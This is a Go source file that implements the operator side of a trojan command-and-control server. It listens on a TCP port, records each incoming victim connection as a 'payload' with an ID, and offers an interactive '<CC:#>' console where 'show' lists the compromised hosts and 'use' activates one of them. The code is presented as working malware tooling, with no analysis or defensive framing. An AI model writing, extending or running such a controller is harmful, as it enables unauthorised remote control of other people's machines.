package cc

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"

	"gopkg.in/mgo.v2/bson"
)

// BufferSize is the amount of bytes being sent to the client
// when uploading a file
const BufferSize = 1024

// CommandControl needs description
type CommandControl struct {
	Port     int
	Target   string
	Payloads []*Payload
}

// Run runs the trojan server
func (c *CommandControl) Run() {
	addr := c.Target + ":" + strconv.Itoa(c.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Printf("[ERROR] listening on %s: %v", addr, err)
		os.Exit(1)
	}

	fmt.Println("[*] listening on", addr)

	go c.acceptConnections(listener)

	// handle connections
	c.handleConnections()
}

func (c *CommandControl) handleConnections() {
	for {
		fmt.Print("<CC:#> ")
		// Read the stdin
		stdreader := bufio.NewReader(os.Stdin)
		text, err := stdreader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading std input", err)
			continue
		}

		// Check the command issued
		switch {
		case strings.TrimSpace(text) == "show":
			for _, p := range c.Payloads {
				fmt.Printf("ID: %s Address: %s\n", p.ID, p.Addr.String())
			}
		case strings.Contains(strings.TrimSpace(text), "use"):
			addr := strings.Split(text, " ")[1]
			p, err := c.getPayload(strings.TrimSpace(addr))
			if err != nil {
				fmt.Println("[ERROR] getting payload", err)
				continue
			}

			p.Activate()
		}
	}
}

func (c *CommandControl) acceptConnections(listener net.Listener) {
	// Keep listening for connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("[ERROR] accepting connection", err)
			continue
		}

		// Create a new payload
		p := &Payload{
			ID:   bson.NewObjectId().Hex(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		// Add the payload to our Payloads slice
		c.Payloads = append(c.Payloads, p)

		fmt.Printf("[*] new connection %s. Total connections: %d\n", p.Addr, len(c.Payloads))
		fmt.Print("<CC:#> ")
	}
}

func (c *CommandControl) getPayload(addr string) (*Payload, error) {
	for _, p := range c.Payloads {
		if p.Addr.String() == addr {
			return p, nil
		}
	}

	return nil, errors.New("payload not found")
}
